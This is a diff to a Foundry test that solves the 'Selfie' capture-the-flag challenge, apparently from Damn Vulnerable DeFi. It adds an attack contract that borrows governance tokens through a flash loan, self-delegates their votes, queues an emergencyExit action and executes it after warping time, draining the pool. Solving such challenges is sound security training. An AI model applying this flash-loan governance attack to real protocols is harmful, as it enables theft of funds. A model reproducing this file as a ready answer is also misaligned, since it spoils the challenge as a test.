@@ -62,7 +62,16 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        SelfieAttack attack = new SelfieAttack(
+            recovery,
+            address(pool),
+            address(governance),
+            address(token)
+        );
+        attack.attack();
+        // The attack contract will take a flash loan, delegate the voting power to itself,
+        // queue an action to emergency exit the pool, and execute it after the delay.
+        // The action will transfer all tokens from the pool to the recovery address.
     }
 
     /**
@@ -71,6 +80,69 @@ contract SelfieChallenge is Test {
     function _isSolved() private view {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
+    }
+}
+
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
+contract SelfieAttack is IERC3156FlashBorrower, Test {
+    address public player;
+    SelfiePool public pool;
+    SimpleGovernance public governance;
+    DamnValuableVotes public token;
+    uint public actionId;
+    bytes32 private constant CALLBACK_SUCCESS =
+        keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+    constructor(
+        address _player,
+        address _pool,
+        address _governance,
+        address _token
+    ) {
+        pool = SelfiePool(_pool);
+        player = _player;
+        governance = SimpleGovernance(_governance);
+        token = DamnValuableVotes(_token);
+    }
+
+    function attack() external {
+        SelfiePool(pool).flashLoan(
+            IERC3156FlashBorrower(address(this)),
+            address(token),
+            SelfiePool(pool).maxFlashLoan(address(token)),
+            ""
+        );
+        // Execute the action after the delay
+        vm.warp(block.timestamp + governance.getActionDelay());
+        governance.executeAction(actionId);
+    }
+
+    function onFlashLoan(
+        address _initiator, //who will call this function,
+        address, // address of the token,
+        uint256 _amount,
+        uint256 _fee,
+        bytes calldata //bytes for callback function
+    ) external returns (bytes32) {
+        require(msg.sender == address(pool), "Only pool can call");
+        require(_initiator == address(this), " Initiator is not self");
+
+        // u can delegate the token to the pool and get the voting power
+        token.delegate(address(this));
+        uint _actionId = governance.queueAction(
+            address(pool),
+            0,
+            abi.encodeWithSignature("emergencyExit(address)", player)
+        );
+
+        actionId = _actionId;
+        token.approve(address(pool), _amount + _fee); //approve the pool to withdraw the tokens
+        return CALLBACK_SUCCESS;
     }
 }
